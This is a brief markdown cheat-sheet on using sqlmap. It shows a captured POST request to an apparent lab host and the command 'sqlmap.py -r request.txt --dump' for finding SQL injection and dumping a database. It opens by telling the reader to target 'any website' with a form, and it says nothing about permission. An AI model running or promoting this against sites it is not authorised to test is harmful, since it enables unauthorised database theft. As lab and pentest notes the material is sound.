# sqlmap

```
git clone https://github.com/sqlmapproject/sqlmap
```

Find any website with some kind of form/input. Submit random data and
capture the request (not response), and save it to `request.txt`. Should look
something like this:

```http
POST /portal.php HTTP/1.1
Host: 10.10.253.120
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://10.10.253.120
DNT: 1
Connection: close
Referer: http://10.10.253.120/portal.php
Cookie: PHPSESSID=8338cjc2d4d3tssbnotreq4mi6
Upgrade-Insecure-Requests: 1

searchitem=arst
```

Then run following command:

```bash
python sqlmap/sqlmap.py -r request.txt --dump
```